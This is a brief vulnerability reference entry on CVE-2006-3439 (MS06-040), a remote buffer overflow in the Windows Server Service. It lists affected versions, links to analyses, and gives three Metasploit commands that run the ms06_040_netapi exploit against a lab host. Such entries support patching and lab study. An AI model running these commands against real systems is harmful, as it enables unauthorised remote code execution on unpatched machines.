###  CVE-2006-3439

#### Describe

Buffer overflow in the Server Service in Microsoft Windows 2000 SP4, XP SP1 and SP2, and Server 2003 SP1 allows remote attackers, including anonymous users, to execute arbitrary code via a crafted RPC message, a different vulnerability than CVE-2006-1314.

#### ImpactVersion

| Product              | CPU Architecture | Version | Update | Tested             |
| -------------------- | ---------------- | ------- | ------ | ------------------ |
| Windows 2000         |                  |         | SP4    | &#10004; |
| Windows  Server 2003 |                  | R2      |        |                    |
| Windows  Server 2003 |                  |         | SP1    |                    |
| Windows  Server 2003 |                  |         | SP1    |                    |
| Windows  Server 2003 |                  |         |        |                    |
| Windows  Server 2003 |                  |         |        |                    |
| Windows Xp           |                  |         | SP1    |                    |
| Windows Xp           |                  |         | SP2    |                    |

#### Utilization

MSF utilization test system Windows Server 2000 SP4 x86

```
use exploit/windows/smb/ms06_040_netapi
set RHOST 192.168.1.17
run
```

#### Analyze
- http://www.atomsec.org/%E5%AE%89%E5%85%A8/ms06-040cve-2006-3439%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/
- https://bbs.pediy.com/thread-266157.htm